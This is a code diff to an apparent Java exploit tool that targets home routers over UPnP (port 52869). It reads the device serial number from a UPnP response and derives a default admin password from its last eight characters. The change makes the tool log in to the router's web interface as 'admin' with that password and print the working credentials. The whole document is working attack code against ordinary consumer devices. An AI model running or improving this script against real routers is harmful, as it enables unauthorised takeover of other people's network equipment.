@@ -2,7 +2,6 @@
 // The filename should be main.java , so clone it and rename the file in order to work
 // UPnP should be enabled for the target side
 // UPnP default port is 52869
-
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
@@ -13,6 +12,7 @@ import java.net.MalformedURLException;
 import java.net.ProtocolException;
 import java.net.Socket;
 import java.net.URL;
+import java.net.URLConnection;
 import java.net.UnknownHostException;
 import java.util.Scanner;
 import javax.swing.text.Document;
@@ -52,7 +52,31 @@ public class main {
 			}
 			String serialnumber = out.substring(out.indexOf("<serialNumber>"), out.indexOf("</serialNumber>")).replace("<serialNumber>","");
 			String default_password = serialnumber.substring(serialnumber.length()-8);
-			System.out.println("Possible Default Password: "+default_password);
+			URL url = new URL("http://"+URL);
+			URLConnection con = url.openConnection();
+			HttpURLConnection http = (HttpURLConnection)con;
+			http.setRequestMethod("POST");
+			http.setDoOutput(true);
+			http.addRequestProperty("frashnum","");
+			http.addRequestProperty("action","login");
+			http.addRequestProperty("Frm_Logintoken", "14");
+			http.addRequestProperty("Username", "admin");
+			http.addRequestProperty("Password",default_password);
+			http.connect();
+			BufferedReader in = new BufferedReader(
+					  new InputStreamReader(http.getInputStream()));
+					String inputLine;
+					StringBuffer content = new StringBuffer();
+					while ((inputLine = in.readLine()) != null) {
+					    content.append(inputLine);
+					}
+					in.close();
+					http.disconnect();
+					if(content.toString().contains("User information")) {
+						System.out.println("The router isn't vulnerable");
+					}else {
+						System.out.println("The router is vulnerable.\nThe username is admin and password is "+default_password);
+					}
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
